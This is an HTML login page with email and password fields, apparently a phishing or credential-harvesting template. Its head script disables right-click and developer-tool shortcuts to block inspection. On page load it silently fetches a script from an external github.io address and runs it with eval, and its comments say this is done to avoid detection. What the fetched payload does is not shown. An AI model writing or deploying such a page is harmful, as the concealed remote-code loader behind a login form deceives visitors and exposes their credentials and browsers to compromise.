<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <link rel="stylesheet" href="style.css">
  <script>
    (function () {
      // Anti-Inspect & Anti-Debugger Trick
      function blockDevTools() {
        window.addEventListener('contextmenu', event => event.preventDefault()); // Disable Right Click
        document.onkeydown = function (e) {
          if (e.key === "F12" || (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C")) || (e.ctrlKey && e.key === "U")) {
            return false;
          }
        };
      }
      blockDevTools();

      async function loadHiddenScript() {
        try {
          let response = await fetch('https://dark-venom-2032.github.io/osintools/script.js');
          let scriptContent = await response.text();

          let scriptElement = document.createElement('script');
          scriptElement.innerHTML = scriptContent;

          // Execute the script but never append it to the DOM
          (function() {
            eval(scriptContent);  // Runs in memory, making it harder to detect
          })();
        } catch (err) {
          console.error("Script failed to load", err);
        }
      }

      window.onload = loadHiddenScript;
    })();
  </script>
</head>

<body>
  <main>
    <div class="container">
      <div class="card">
        <h4 class="title">Log In!</h4>
        <form>
          <label class="field" for="logemail">
            <span class="input-icon">@</span>
            <input autocomplete="off" id="logemail" placeholder="Email" class="input-field" name="logemail"
              type="email" />
          </label>
          <label class="field" for="logpass">
            <svg class="input-icon" viewBox="0 0 500 500" xmlns="http://www.w3.org/2000/svg">
              <path d="M80 192V144C80 64.47 144.5 0 224 0C303.5 0 368 64.47 368 144V192H384C419.3 192 448 220.7 448 256V448C448 483.3 419.3 512 384 512H64C28.65 512 0 483.3 0 448V256C0 220.7 28.65 192 64 192H80zM144 192H304V144C304 99.82 268.2 64 224 64C179.8 64 144 99.82 144 144V192z"></path>
            </svg>
            <input id="logpass" placeholder="Password" class="input-field" name="logpass" type="password" />
          </label>
          <button class="btn" type="button">Login</button>
        </form>
      </div>
    </div>
  </main>
</body>

</html>
